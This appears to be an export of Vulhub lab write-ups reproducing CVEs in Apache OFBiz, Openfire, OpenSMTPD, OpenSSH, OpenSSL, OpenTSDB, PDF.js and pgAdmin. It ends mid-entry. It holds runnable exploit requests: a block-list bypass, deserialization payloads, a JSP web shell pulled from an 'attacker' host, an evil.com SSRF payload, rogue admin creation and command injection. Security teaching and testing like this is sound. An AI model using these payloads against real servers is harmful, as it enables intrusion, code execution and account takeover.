User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDbR7sY3IIwQX7kcJ
Content-Length: 190
-----WebKitFormBoundaryDbR7sY3IIwQX7kcJ
Content-Disposition: form-data; name=""groovyProgram""

throw new Exception('id'.\u0065xecute().text);
-----WebKitFormBoundaryDbR7sY3IIwQX7kcJ--




Noted that Apache Ofbiz restricts the use of the following keywords, but we can bypass this restriction using Unicode characters like \u0065xecute.


deniedWebShellTokens=java.,beans,freemarker,<script,javascript,<body,body ,<form,<jsp:,<c:out,taglib,<prefix,<%@ page,<?php,exec(,alert(,\
                     %eval,@eval,eval(,runtime,import,passthru,shellexec,assert,strrot13,system,decode,include,page ,\
                     chmod,mkdir,fopen,fclose,new file,upload,getfilename,download,getoutputstring,readfile,iframe,object,embed,onload,build,\
                     python,perl ,/perl,ruby ,/ruby,process,function,class,InputStream,to_server,wget ,static,assign,webappPath,\
                     ifconfig,route,crontab,netstat,uname ,hostname,iptables,whoami,""cmd"",*cmd|,+cmd|,=cmd|,localhost,thread,require,gzdeflate,\
                     execute,println,calc,touch,calculate
-------------------------------------------------------------------------------","https://github.com/apache/ofbiz-framework/commit/31d8d7
https://forum.butian.net/article/524
https://github.com/Praison001/CVE-2024-38856-ApacheOfBiz"
ofbiz,CVE-2023-49070,Unsafe deserialization of XMLRPC arguments in Apache OFBiz (CVE-2023-49070),"Unsafe deserialization of XMLRPC arguments in Apache OFBiz (CVE-2023-49070)

中文版本(Chinese version)

Apache OFBiz is an open source enterprise resource planning (ERP) system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise.

Apahce OFBiz prior to 17.12.03, there is a deserialization issue caused by XMLRPC endpoint at /webtools/control/xmlrpc, which is marked as CVE-2020-9496. Developer fixed this issue by adding authentication check and filter, but the patches have been bypassed by CVE-2023-49070.

Apache OFBiz deleted XMLRPC interface to escape this nightmare at version 18.12.10 eventually.

References:
<https://www.openwall.com/lists/oss-security/2023/12/04/2
<https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2020-9496

Vulnerable environment

Executing following command to start an Apache OfBiz 18.12.09 server:


docker compose up -d


After a short wait, you can see the login page at https://localhost:8443/accounting.

Vulnerability Reproduce

The method to reproduce CVE-2023-49070 is similar to CVE-2020-9496, except that it requires bypassing the patches.

First of all, use ysoserial to generate a CommonsBeanutils1 gadget payload:


java -jar ysoserial.jar CommonsBeanutils1 ""touch /tmp/success"" | base64 | tr -d ""\n""




Sending packets using the method in CVE-2020-9496 no longer works:



But modifing the path to /webtools/control/xmlrpc;/?USERNAME=&PASSWORD=&requirePasswordChange=Y is able to bypass the restriction:


POST /webtools/control/xmlrpc;/?USERNAME=&PASSWORD=&requirePasswordChange=Y HTTP/1.1
Host: your-ip
Content-Type: application/xml
Content-Length: 4093

<?xml version=""1.0""?
<methodCall
  <methodNameProjectDiscovery</methodName
  <params
    <param
      <value
        <struct
          <member
            <nametest</name
            <value
              <serializable xmlns=""http://ws.apache.org/xmlrpc/namespaces/extensions""[base64-payload]</serializable
            </value
          </member
        </struct
      </value
    </param
  </params
</methodCall




touch /tmp/success has been executed in the container:
-------------------------------------------------------------------------------","https://www.openwall.com/lists/oss-security/2023/12/04/2
https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2020-9496"
ofbiz,CVE-2023-51467,Apache OFBiz Authentication Bypass Leads to RCE (CVE-2023-51467),"Apache OFBiz Authentication Bypass Leads to RCE (CVE-2023-51467)

中文版本(Chinese version)

Apache OFBiz is an open source enterprise resource planning (ERP) system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise.

This vulnerability occurs as a result of incomplete fixing for CVE-2023-49070. In Apache OFBiz version 18.12.10, the developers removed the XMLRPC to fix the previous RCE issue, but the authentication bypass still exists. The researcher from Chaitin Tech found another attack approach to perform the pre-auth RCE using Groovy expression injection.

References:
<https://github.com/apache/ofbiz-framework/commit/d8b097f6717a4004acf023dfe929e0e41ad63faa
<https://xz.aliyun.com/t/13211
<https://y4tacker.github.io/2023/12/27/year/2023/12/Apache-OFBiz%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%85%E6%9E%90-CVE-2023-51467/

Vulnerable environment

Executing following command to start an Apache OfBiz 18.12.10 server:


docker compose up -d


After a short wait, you can see the login page at https://localhost:8443/accounting.

Vulnerability Reproduce

Send following request to execute command id by Groovy script:


POST /webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y HTTP/1.1
Host: localhost:8443
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

groovyProgram=throw+new+Exception('id'.execute().text);
-------------------------------------------------------------------------------","https://github.com/apache/ofbiz-framework/commit/d8b097f6717a4004acf023dfe929e0e41ad63faa
https://xz.aliyun.com/t/13211
https://y4tacker.github.io/2023/12/27/year/2023/12/Apache-OFBiz%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%85%E6%9E%90-CVE-2023-51467/"
ofbiz,CVE-2020-9496,Unsafe deserialization of XMLRPC arguments in ApacheOfBiz (CVE-2020-9496),"Unsafe deserialization of XMLRPC arguments in ApacheOfBiz (CVE-2020-9496)

中文版本(Chinese version)

Apache OFBiz is an open source enterprise resource planning (ERP) system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise.

OfBiz exposes an XMLRPC endpoint at /webtools/control/xmlrpc. This is an unauthenticated endpoint since authentication is applied on a per-service basis. However, the XMLRPC request is processed before authentication. As part of this processing, any serialized arguments for the remote invocation are deserialized, therefore if the classpath contains any classes that can be used as gadgets to achieve remote code execution, an attacker will be able to run arbitrary system commands on any OfBiz server with same privileges as the servlet container running OfBiz.

References:

1. https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz
2. https://github.com/dwisiswant0/CVE-2020-9496
3. https://www.cnblogs.com/ph4nt0mer/p/13576739.html

Vulnerable environment

Executing following command to start an Apache OfBiz (17.12.01):


docker compose up -d


After a short wait, you can see the login page at https://localhost:8443/accounting.

Vulnerability Reproduce

There is no error message in response by default, we can't reproduce the vulnerability using the POC of reference link 2, so ask ysoserial for help.

Generate the CommonsBeanutils1 payload:


java -jar ysoserial.jar CommonsBeanutils1 ""touch /tmp/success"" | base64 | tr -d ""\n""




Replace the [base64-payload] and send the request:


POST /webtools/control/xmlrpc HTTP/1.1
Host: your-ip
Content-Type: application/xml
Content-Length: 4093

<?xml version=""1.0""?
<methodCall
  <methodNameProjectDiscovery</methodName
  <params
    <param
      <value
        <struct
          <member
            <nametest</name
            <value
              <serializable xmlns=""http://ws.apache.org/xmlrpc/namespaces/extensions""[base64-payload]</serializable
            </value
          </member
        </struct
      </value
    </param
  </params
</methodCall




touch /tmp/success is succesful executing in the container:
-------------------------------------------------------------------------------","https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz
https://github.com/dwisiswant0/CVE-2020-9496
https://www.cnblogs.com/ph4nt0mer/p/13576739.html"
ofbiz,CVE-2024-45195,Apache OFBiz Authentication Bypass Leads to RCE (CVE-2024-45195),"Apache OFBiz Authentication Bypass Leads to RCE (CVE-2024-45195)

中文版本(Chinese version)

Apache OFBiz is an open source enterprise resource planning (ERP) system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise.

This vulnerability occurs as a result of incomplete fixing for previous vulnerabilities (CVE-2024-32113, CVE-2024-36104, and CVE-2024-38856). In Apache OFBiz versions prior to 18.12.16, the developers implemented fixes for these previous issues, but the underlying problem of controller-view map state desynchronization still existed. This allowed attackers to bypass authentication and access sensitive admin-only view maps.

References:
<https://github.com/apache/ofbiz-framework/commit/ab78769c2d
<https://github.com/apache/ofbiz-plugins/commit/8b95fe6fa
<https://www.rapid7.com/blog/post/2024/09/05/cve-2024-45195-apache-ofbiz-unauthenticated-remote-code-execution-fixed/

Vulnerable environment

Executing following command to start an Apache OfBiz 18.12.15 server:


docker compose up -d


After a short wait, you can see the login page at https://localhost:8443/accounting.

Vulnerability Reproduce

Before reproducing the vulnerability, this exploit requires setting up a malicious XML schema file and a CSV file on an attacker-controlled server

First one rceschema.xml, this XML schema defines the structure of the malicious JSP:

xml
<data-files xsi:noNamespaceSchemaLocation=""http://ofbiz.apache.org/dtds/datafiles.xsd"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
    <data-file name=""rce"" separator-style=""fixed-length"" type-code=""text"" start-line=""0"" encoding-type=""UTF-8""
        <record name=""rceentry"" limit=""many""
            <field name=""jsp"" type=""String"" length=""605"" position=""0""</field
        </record
    </data-file
</data-files


Second one rcereport.csv, this CSV file contains the actual JSP code:

jsp
<%@ page import='java.io.' %<%@ page import='java.util.' %<h1Ahoy!</h1<br<% String getcmd = request.getParameter(""cmd""); if (getcmd != null) { out.println(""Command: "" + getcmd + ""<br""); String cmd1 = ""/bin/sh""; String cmd2 = ""-c""; String cmd3 = getcmd; String[] cmd = new String[3]; cmd[0] = cmd1; cmd[1] = cmd2; cmd[2] = cmd3; Process p = Runtime.getRuntime().exec(cmd); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine();}} %,


Then send the following request:


POST /webtools/control/forgotPassword/viewdatafile HTTP/1.1
Host: target:8443
User-Agent: curl/7.81.0
Accept: /
Content-Length: 241
Content-Type: application/x-www-form-urlencoded

DATAFILELOCATION=http://attacker/rcereport.csv&DATAFILESAVE=./applications/accounting/webapp/accounting/index.jsp&DATAFILEISURL=true&DEFINITIONLOCATION=http://attacker/rceschema.xml&DEFINITIONISURL=true&DEFINITIONNAME=rce




This request exploits the vulnerability by leveraging the viewdatafile view map to write a malicious JSP file to the web root, effectively achieving remote code execution.

After the JSP webshell is written, execute arbitrary commands through https://localhost:8443/accounting/index.jsp?cmd=id:
-------------------------------------------------------------------------------","https://github.com/apache/ofbiz-framework/commit/ab78769c2d
https://github.com/apache/ofbiz-plugins/commit/8b95fe6fa
https://www.rapid7.com/blog/post/2024/09/05/cve-2024-45195-apache-ofbiz-unauthenticated-remote-code-execution-fixed/"
ofbiz,CVE-2024-45507,Apache OFBiz SSRF and Remote Code Execution (CVE-2024-45507),"Apache OFBiz SSRF and Remote Code Execution (CVE-2024-45507)

中文版本(Chinese version)

Apache OFBiz is an open source enterprise resource planning (ERP) system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise.

This vulnerability (CVE-2024-45507) affects Apache OFBiz versions prior to 18.12.16. It allows an unauthenticated attacker to perform Server-Side Request Forgery (SSRF) and potentially achieve remote code execution.

References:
<https://github.com/apache/ofbiz-framework/commit/ffb1bc4879
<https://xz.aliyun.com/t/15569
<https://paper.seebug.org/3228/

Vulnerable environment

Execute the following command to start an Apache OFBiz 18.12.15 server:


docker compose up -d


After a short wait, you can see the login page at https://localhost:8443/accounting.

Vulnerability Reproduce

Server-Side Request Forgery (SSRF) attack

Send a POST request to /webtools/control/forgotPassword/StatsSinceStart with the following request:


POST /webtools/control/forgotPassword/StatsSinceStart HTTP/1.1
Host: localhost:8443
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

statsDecoratorLocation=http://10.10.10.10/path/to/api


Remote Code Execution

Create a malicious XML file (payload.xml) on a public server like http://evil.com/ofbiz/payload.xml:

xml
<?xml version=""1.0"" encoding=""UTF-8""?
<screens xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
        xmlns=""http://ofbiz.apache.org/Widget-Screen"" xsi:schemaLocation=""http://ofbiz.apache.org/Widget-Screen http://ofbiz.apache.org/dtds/widget-screen.xsd""

    <screen name=""StatsDecorator""
        <section
            <actions
                <set value=""${groovy:'touch /tmp/success'.execute();}""/
            </actions
        </section
    </screen
</screens


Then replace your malicious XML url into following request and send:


POST /webtools/control/forgotPassword/StatsSinceStart HTTP/1.1
Host: localhost:8443
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

statsDecoratorLocation=http://evil.com/ofbiz/payload.xml




The command touch /tmp/success will be executed on the target server, demonstrating successful exploitation.
-------------------------------------------------------------------------------","https://github.com/apache/ofbiz-framework/commit/ffb1bc4879
https://xz.aliyun.com/t/15569
https://paper.seebug.org/3228/
http://ofbiz.apache.org/dtds/widget-screen.xsd"">"
openfire,CVE-2023-32315,Openfire Admin Console Authentication Bypass (CVE-2023-32315),"Openfire Admin Console Authentication Bypass (CVE-2023-32315)

中文版本(Chinese version)

Openfire is a real time collaboration (RTC) server licensed under the Open Source Apache License. It uses the only widely adopted open protocol for instant messaging, XMPP (also called Jabber).

In the version prior to 4.7.4 and 4.6.7, Openfire's administrative console (the Admin Console), a web-based application, was found to be vulnerable to a path traversal attack via the setup environment. This permitted an unauthenticated user to use the unauthenticated Openfire Setup Environment in an already configured Openfire environment to access restricted pages in the Openfire Admin Console reserved for administrative users.

References:
<https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm
<https://mp.weixin.qq.com/s/EzfB8CM4y4aNtKFJqSOM1w

Vulnerable Environment

Execute following command to start a Openfire server 4.7.4:


docker compose up -d


After the server is started, open the link http://your-ip:9090 then you will be redirected to login page if you don't have the authentication.

Exploit

More than a decade ago, an path traversal issue was found in Openfire admin console, CVE-2008-6508. Attackers are able to use the /setup/setup-/../../[page].jsp to bypass the authentication checks and visit arbitratry page without knowning the admin username and password.

Since then the path traversal protections were already in place to protect against exactly this kind of attack.

A later upgrade of the embedded webserver included support for non-standard URL encoding of UTF-16 characters. The path traversal protections in place in Openfire were not updated to include protection against this new encoding. So attackers are able to use the /setup/setup-/%u002e%u002e/%u002e%u002e/[page].jsp to bypass the path traversal protection again.

To exploit this issue, the first step is to create a new administrator through following request:


GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=csrftoken&username=hackme&name=&email=&password=hackme&passwordConfirm=hackme&isadmin=on&create=Create+User HTTP/1.1
Host: localhost:9090
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: csrf=csrftoken




Although an exception is raised in response but an account with both username and password ""hackme"" is created.



Then log in to the admin console with this account, and you can see that hackme is already an administrator.
-------------------------------------------------------------------------------","https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm
https://mp.weixin.qq.com/s/EzfB8CM4y4aNtKFJqSOM1w"
opensmtpd,CVE-2020-7247,OpenSMTPD Remote Code Execution Vulnerability (CVE-2020-7247),"OpenSMTPD Remote Code Execution Vulnerability (CVE-2020-7247)

中文版本(Chinese version)

OpenSMTPD is an smtp service program for unix operating systems (BSD, MacOS, GNU/Linux), following the RFC 5321 SMTP protocol. OpenSMTPD was originally developed for the OpenBSD operating system and is part of the OpenBSD project. Due to its open source properties, Distributed to other unix platforms. According to the ISC license, the software is free for everyone to use and reuse.

CVE-2020-7247 is caused by OpenSMTPD's lax verification of the sender/recipient in the process of implementing RFC 5321.

On January 29, 2020, OpenSMTPD group officially submitted a fix for the CVE-2020-7247 in the GitHub repository. After the repair, the corresponding version is OpenSMTPD 6.6.2p1.

Reference：
https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt
https://www.exploit-db.com/exploits/47984
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247
https://www.anquanke.com/post/id/197689

Start Vulnerability Application

Start a vulnerable OpenSMTPD through following command:


docker compose up -d


After SMTPD server is started, connect to the 8825 port and get the result (44dadcc5a6eb is the container ID):


$ nc <your-ip8825 -v
220 44dadcc5a6eb ESMTP OpenSMTPD


Vulnerability Reproduce

Use Exploit-DB to gain a reverse shell:


python3 poc.py your-ip 8825 <command
-------------------------------------------------------------------------------","https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt
https://www.exploit-db.com/exploits/47984
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247
https://www.anquanke.com/post/id/197689"
openssh,CVE-2018-15473,OpenSSH Username Enumeration (CVE-2018-15473),"OpenSSH Username Enumeration (CVE-2018-15473)

中文版本(Chinese version)

OpenSSH is a suite of secure networking utilities based on the Secure Shell protocol, which provides a secure channel over an unsecured network in a client–server architecture.

CVE-2018-15473 is a medium-severity vulnerability affecting OpenSSH versions up to and including 7.7. This vulnerability allows user enumeration due to the system not delaying bailout for an invalid authenticating user until after the packet containing the request has been fully parsed. As a result, a remote attacker can test whether a certain user exists on a target OpenSSH server.

References:
http://openwall.com/lists/oss-security/2018/08/15/5
https://github.com/Rhynorater/CVE-2018-15473-Exploit
https://www.anquanke.com/post/id/157607

Vulnerable environment

Execute following commands to start a OpenSSH server 7.7p1:


docker compose build
docker compose up -d


After the server is started, you can log in to OpenSSH server by ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@your-ip -p20022 and password vulhub.

Vulnerability reproduce

Use CVE-2018-15473-Exploit to enumerate usernames in the dictionary:


python3 sshUsernameEnumExploit.py --port 20022 --userList exampleInput.txt your-ip




As you can see, root、example、vulhub、nobody are existing usernames, rootInvalid、user、phithon are non-existent usernames.
-------------------------------------------------------------------------------","http://openwall.com/lists/oss-security/2018/08/15/5
https://github.com/Rhynorater/CVE-2018-15473-Exploit
https://www.anquanke.com/post/id/157607"
openssl,CVE-2014-0160,OpenSSL Heartbleed Memory Leak Leads to Information Disclosure (CVE-2014-0160),"OpenSSL Heartbleed Memory Leak Leads to Information Disclosure (CVE-2014-0160)

中文版本(Chinese version)

The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet. SSL/TLS provides communication security and privacy over the Internet for applications such as web, email, instant messaging (IM) and some virtual private networks (VPNs).

The Heartbleed bug allows anyone on the Internet to read the memory of the systems protected by the vulnerable versions of the OpenSSL software. This compromises the secret keys used to identify the service providers and to encrypt the traffic, the names and passwords of the users and the actual content. This allows attackers to eavesdrop on communications, steal data directly from the services and users and to impersonate services and users.

References:
https://heartbleed.com/
https://filippo.io/Heartbleed

Setup

Execute following command to start a Nginx server with OpenSSL 1.0.1c:


docker compose up -d


After the server is started, browse the https://your-ip:8443 to see the welcome page.

We have encountered an error when running this environment where some AMD architecture CPUs were unable to access the https page successfully. If you have a similar problem, try an Intel CPU instead.

POC

Visit https://filippo.io/Heartbleed to check the result:



Run ssltest.py with Python to obtain sensitive data (such as Cookie):
-------------------------------------------------------------------------------","https://heartbleed.com/
https://filippo.io/Heartbleed"
openssl,CVE-2022-0778,OpenSSL Infinite Loop Leads to DoS (CVE-2022-0778),"OpenSSL Infinite Loop Leads to DoS (CVE-2022-0778)

中文版本(Chinese version)

OpenSSL is a software library for applications that secure communications over computer networks against eavesdropping or need to identify the party at the other end.

A flaw was found in OpenSSL. It is possible to trigger an infinite loop by crafting a certificate that has invalid elliptic curve parameters. Since certificate parsing happens before verification of the certificate signature, any process that parses an externally supplied certificate may be subject to a denial of service attack.

Reference links:
<https://github.com/drago-96/CVE-2022-0778
<https://www.cnblogs.com/logchen/p/16030515.html
<https://catbro666.github.io/posts/83951100/
<https://github.com/yywing/cve-2022-0778

Vulnerability environment

Execute following command to start a server:


docker compose up -d


Reproduce vulnerability

Firstly, use this project to build and run an evil server. If you don't have the Golang compiler, just use the Docker image:


docker run -it --rm -p 12345:12345 yywing/cve-2022-0778 --addr 0.0.0.0:12345


Then you can monitor the CPU usage inside the container through top:


docker compose exec curl top


This vulnerability is available when parsing the certificate, so we can use the cURL to demonstrate it.

Entry the environment, and use the cURL to browse the evil server that started before:


docker compose exec curl bash
curl -k https://host.docker.internal:12345


At this point, cURL will be caught in an infinite loop, and CPU resources will be exhausted unexpectedly:
-------------------------------------------------------------------------------","https://github.com/drago-96/CVE-2022-0778
https://www.cnblogs.com/logchen/p/16030515.html
https://catbro666.github.io/posts/83951100/
https://github.com/yywing/cve-2022-0778
https://host.docker.internal:12345"
openssl,Unknown,"This page moved to CVE-2014-0160
-------------------------------------------------------------------------------","This page moved to CVE-2014-0160
-------------------------------------------------------------------------------",
opentsdb,CVE-2023-25826,OpenTSDB Arbitrary Command Injection Remote Code Execution（CVE-2023-25826）,"OpenTSDB Arbitrary Command Injection Remote Code Execution（CVE-2023-25826）

中文版本(Chinese version)

OpenTSDB is a distributed, scalable Time Series Database (TSDB) written on top of HBase.
In version 2.4.1 and earlier, there is a command injection vulnerability. This vulnerability is actually due to an incomplete fix for CVE-2020-35476, so the entire reproduction process is similar to the previous one.

References:
https://www.synopsys.com/blogs/software-security/opentsdb/
https://github.com/OpenTSDB/opentsdb/pull/2275

Environment

Execute the following command to start a OpenTSDB server 2.4.1:


docker-compose up -d


Once the service is started, visit http://your-ip:4242 to see the web interface of the OpenTSDB.

Exploit

Simialar as CVE-2020-35476, you need to know the name of a metric, visit http://your-ip:4242/api/suggest?type=metrics&q=&max=10to find out the metric list.

Due to the tsd.core.autocreatemetrics is set to true in this vulnerable OpenTSDB, you can create a metric named sys.cpu.nice through following request, if the metrics are empty:


POST /api/put/ HTTP/1.1
Host: your-ip:4242
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 150

{
    ""metric"": ""sys.cpu.nice"",
    ""timestamp"": 1346846400,
    ""value"": 20,
    ""tags"": {
       ""host"": ""web01"",
       ""dc"": ""lga""
    }
}


If at least one metric exists and is not empty, the above request is not required.

Then the POC is different here, with the difference in the ""key"" parameter.


GET /q?start=2000/10/21-00:00:00&m=sum:sys.cpu.nice&o=&ylabel=1&xrange=&y2range=[42:42]&key=%3Bsystem%20%22touch%20/tmp/poc%22%20%22&wxh=1516x644&style=linespoint&baba=lala&grid=t&json HTTP/1.1
Host: your-ip:4242
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close






touch /tmp/poc has been successfully executed:
-------------------------------------------------------------------------------","https://www.synopsys.com/blogs/software-security/opentsdb/
https://github.com/OpenTSDB/opentsdb/pull/2275"
opentsdb,CVE-2020-35476,OpenTSDB Arbitrary Command Injection Remote Code Execution (CVE-2020-35476),"OpenTSDB Arbitrary Command Injection Remote Code Execution (CVE-2020-35476)

中文版本(Chinese version)

OpenTSDB is a distributed, scalable Time Series Database (TSDB) written on top of HBase.

A remote code execution vulnerability occurs in OpenTSDB through 2.4.0 via command injection in the yrange parameter. The yrange value is written to a gnuplot file in the /tmp directory. This file is then executed via the mygnuplot.sh shell script. (tsd/GraphHandler.java attempted to prevent command injections by blocking backticks but this is insufficient.)

References:
https://github.com/OpenTSDB/opentsdb/issues/2051
https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html

Vulnerable Environment

Execute the following command to start a OpenTSDB server 2.4.0:


docker compose up -d


Once the service is started, visit http://your-ip:4242 to see the web interface of the OpenTSDB.

Exploit

You need to know the name of a metric before you can exploit this vulnerability on http://your-ip:4242/api/suggest?type=metrics&q=&max=10:



However, the metrics list is empty.

Fortunately, the tsd.core.autocreatemetrics is set to true in this vulnerable OpenTSDB, so you can create a metric named sys.cpu.nice through following request:


POST /api/put/ HTTP/1.1
Host: your-ip:4242
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 150

{
    ""metric"": ""sys.cpu.nice"",
    ""timestamp"": 1346846400,
    ""value"": 20,
    ""tags"": {
       ""host"": ""web01"",
       ""dc"": ""lga""
    }
}


If at least one metric exists and is not empty, the above request is not required.

Send following request, where the value of the parameter m must contain a valid metric name:


GET /q?start=2000/10/21-00:00:00&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[0:system(%27touch%20/tmp/success%27)]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json HTTP/1.1
Host: your-ip:4242
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close






touch /tmp/success has been successfully executed.
-------------------------------------------------------------------------------","https://github.com/OpenTSDB/opentsdb/issues/2051
https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html"
pdfjs,CVE-2024-4367,PDF.js Arbitrary JavaScript Code Execution (CVE-2024-4367),"PDF.js Arbitrary JavaScript Code Execution (CVE-2024-4367)

中文版本(Chinese version)

PDF.js is a Portable Document Format (PDF) viewer that is built with HTML5.

In the PDF.js version prior to 4.1.392, a JavaScript code injection was found. This bug allows an attacker to execute arbitrary JavaScript code as soon as a malicious PDF file is opened.

References:
<https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/

Vulnerable environment

Execute following command to start a server that contains PDF.js 4.1.392:


docker compose up -d


After the server is started, browse http://your-ip:8080 you will see an uploading page.

Vulnerability reproduce

Upload malicious PDF file poc.pdf to trigger the XSS:
-------------------------------------------------------------------------------",https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/
pgadmin,CVE-2023-5002,pgAdmin <= 7.6 Authenticated Remote Command Execution (CVE-2023-5002),"pgAdmin <= 7.6 Authenticated Remote Command Execution (CVE-2023-5002)

中文版本(Chinese version)

pgAdmin is a popular and feature rich Open Source administration and development platform for PostgreSQL, the most advanced Open Source database in the world.

A flaw was found in pgAdmin. This issue occurs when the pgAdmin server HTTP API validates the path a user selects to external PostgreSQL utilities such as pgdump and pgrestore. Versions of pgAdmin prior to 7.7 failed to properly control the server code executed on this API, allowing an authenticated user to run arbitrary commands on the server.

References:
<https://github.com/pgadmin-org/pgadmin4/commit/35f05e49b3632a0a674b9b36535a7fe2d93dd0c2
<https://github.com/advisories/GHSA-ghp8-52vx-77j4

Vulnerable Environment

Execute following command to start a pgAdmin 7.6 server:


docker compose up -d


After the server is started, browse the http://your-ip:5050 to see the default login page of pgAdmin.

Something we should know before exploiting the issue

CVE-2023-5002 is a pathes bypass for previous issue CVE-2022-4223. There are 2 updates from official patches:
Added @loginrequired to validatebinary_path function, not allowed unauthenticated user to access this API
Added os.path.exists() to check if the user provided parameter is a valid path

Unfortunately, we can only bypass the second patch, so the CVE-2023-5002 is a authenticated vulerability.

Exploit

Login the pgAdmin by username vulhub@example.com and password vulhub.

Select ""Tools -Storage Manager"" to open the filemanager dialog:



Create a new folder which name is a crafted payload "";id;#:



Full path of this folder is /var/lib/pgadmin/storage/vulhub_example.com/"";id;#, we will use this path to complete the exploitation.

Go to ""File -Preferences"" to open the setting dialog, open the ""Paths -Binary paths"" panel.

Fill the /var/lib/pgadmin/storage/vulhub_example.com/"";id;# into any field of ""PostgreSQL Binary Path"" then click validate:



As you can see, the id command is executed successful:
-------------------------------------------------------------------------------","https://github.com/pgadmin-org/pgadmin4/commit/35f05e49b3632a0a674b9b36535a7fe2d93dd0c2
https://github.com/advisories/GHSA-ghp8-52vx-77j4"
pgadmin,CVE-2022-4223,pgAdmin <= 6.16 Unauthenticated Remote Command Execution (CVE-2022-4223),"pgAdmin <= 6.16 Unauthenticated Remote Command Execution (CVE-2022-4223)

中文版本(Chinese version)

pgAdmin is a popular and feature rich Open Source administration and development platform for PostgreSQL, the most advanced Open Source database in the world.

The pgAdmin server includes an HTTP API that is intended to be used to validate the path a user selects to external PostgreSQL utilities such as pgdump and pgrestore. The utility is executed by the server to determine what PostgreSQL version it is from. Versions of pgAdmin prior to 6.17 failed to properly secure this API, which could allow an unauthenticated user to execute arbitrary commands on the server.

References:
<https://github.com/pgadmin-org/pgadmin4/commit/799b6d8f7c10e920c9e67c2c18d381d6320ca604
<https://github.com/pgadmin-org/pgadmin4/commit/461849c2763e680ed2296bb8a753ca7aef546595
<https://github.com/advisories/GHSA-3v6v-2x6p-32mc

Vulnerable Environment

Execute following command to start a pgAdmin 6.16 server:


docker compose up -d


After the server is started, browse the http://your-ip:5050 to see the default login page of pgAdmin.

Exploit

